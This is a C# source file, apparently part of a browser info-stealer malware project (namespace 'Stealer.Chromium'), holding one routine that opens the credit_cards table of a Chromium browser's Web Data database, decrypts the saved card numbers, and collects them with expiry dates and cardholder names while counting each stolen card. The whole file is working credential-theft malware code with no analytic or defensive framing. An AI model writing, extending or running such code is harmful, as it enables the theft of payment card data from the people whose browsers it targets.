using System.Collections.Generic;

namespace Stealer.Chromium
{
    internal sealed class CreditCards
    {
        /// <summary>
        /// Get CreditCards from chromium based browsers
        /// </summary>
        /// <param name="sWebData"></param>
        /// <returns>List with credit cards</returns>
        public static List<CreditCard> Get(string sWebData)
        {
            try
            {
                List<CreditCard> lcCC = new List<CreditCard>();

                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sWebData, "credit_cards");
                if (sSQLite == null)
                    return lcCC;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    CreditCard cCard = new CreditCard();

                    cCard.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sSQLite.GetValue(i, 4)));
                    cCard.sExpYear = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
                    cCard.sExpMonth = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
                    cCard.sName = Crypto.GetUTF8(sSQLite.GetValue(i, 1));

                    Counter.CreditCards++;
                    lcCC.Add(cCard);
                }

                return lcCC;
            }
            catch { return new List<CreditCard>(); }
        }
    }
}
